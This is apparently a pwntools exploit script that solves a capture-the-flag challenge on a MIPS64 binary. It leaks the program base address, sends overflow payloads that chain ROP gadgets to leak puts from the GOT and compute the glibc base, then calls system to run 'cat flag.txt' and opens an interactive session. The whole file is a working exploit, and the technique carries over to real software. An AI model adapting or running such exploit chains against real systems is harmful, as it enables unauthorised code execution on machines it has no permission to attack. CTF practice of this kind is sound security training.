from pwn import *

context.arch = 'mips64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chal_patched', '''
#     b *main
#     continue
# ''')

# p = process(['./qemu-mips64el', '-L', '/usr/mips64el-linux-gnuabi64', './chal'])

p = remote('host.docker.internal', 21004)

GADGET1_OFFSET = 0xcdc # ld $v0, -0x7fc0($gp); daddiu $a0, $v0, 0xe48; ld $v0, -0x7f78($gp); move $t9, $v0; jalr $t9;
GADGET2_OFFSET = 0xd18 # ld $v0, -0x7f78(gp); move $t9, $v0; jalr $t9; nop; move $a0, $fp; ld $v0, -0x7f68(gp); move $t9, $v0; jalr $t9; nop; move $v0, $zero; move $sp, $fp; ld $ra, 0x38($sp); ld $fp, 0x30($sp); ld $gp, 0x28($sp); daddiu $sp, $sp, 0x40; jr $ra;
GADGET3_OFFSET = 0xd44 # ld $ra, 0x38($sp); ld $fp, 0x30($sp); ld $gp, 0x28($sp); daddiu $sp, $sp, 0x40; jr $ra;

PUTS_GOT_OFFSET = 0x20098
FOOD1_OFFSET = 0x20100
GP_OFFSET = 0x28010

FAKE_S8_OFFSET = 0x20800

PUTS_OFFSET = 0xa0a60
SYSTEM_OFFSET = 0x7aa10

p.recvuntil(b"A long time ago in a galaxy far, far away... ")
elf_base_addr = int(p.recvline().strip(), 16)-0xc40
log.info(f"elf base address: {hex(elf_base_addr)}")

p.recvuntil(b"Baby Yoda is hungry! Give it some food!\n")
p.send(p64(elf_base_addr+PUTS_GOT_OFFSET-0xe48)+b'A'*0x40+p64(elf_base_addr+GADGET3_OFFSET))

p.recvuntil(b"Baby Yoda is still hungry! Give it more food!\n")
p.sendline(b'A'*0x28+p64(elf_base_addr+FOOD1_OFFSET+0x7fc0)+p64(elf_base_addr+FAKE_S8_OFFSET)+p64(elf_base_addr+GADGET1_OFFSET)+b'A'*0x28+p64(elf_base_addr+GP_OFFSET)+p64(elf_base_addr+FAKE_S8_OFFSET)+p64(elf_base_addr+GADGET2_OFFSET))
glibc_base_addr = u64(p.recv(6).ljust(8, b'\x00'))-PUTS_OFFSET
log.info(f"glibc base address: {hex(glibc_base_addr)}")

p.recvline()
p.sendline(p64(elf_base_addr+FAKE_S8_OFFSET+0x50-0xe48)+b'A'*0x20+p64(elf_base_addr+FAKE_S8_OFFSET+0x7fc0)+p64(elf_base_addr+FAKE_S8_OFFSET)+p64(elf_base_addr+GADGET1_OFFSET)+b'A'*8+p64(glibc_base_addr+SYSTEM_OFFSET)+b'cat flag.txt\x00')

p.interactive()